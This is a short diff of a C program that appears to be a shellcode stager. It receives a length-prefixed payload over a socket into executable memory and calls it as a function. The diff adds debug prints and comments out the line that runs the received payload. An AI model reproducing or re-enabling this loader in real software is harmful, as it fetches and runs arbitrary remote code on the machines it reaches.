@@ -44,11 +44,11 @@ int main() {
   int size = 0;
   int rcvd = 0;
 
-  printf("Receiving");
+  printf("Receiving\n");
   do {
     res = recv( ConnectSocket, index, BUF_LEN, 0 );
     if (res > 0) {
-      if (rcvd == 0) { size = ntohl(*index); }
+      if (rcvd == 0) { size = ntohl(*index); printf("Size: %d\n", size); }
       index += res;
       rcvd += res;
     }
@@ -60,8 +60,8 @@ int main() {
 //    }
   } while (size > rcvd);
 
-  printf("Executing payload.\n");
+  //printf("Executing payload.\n");
   // Execute the received payload
-  (*(void(*)()) (rwx + 4))();
+  //(*(void(*)()) (rwx + 4))();
 }
 
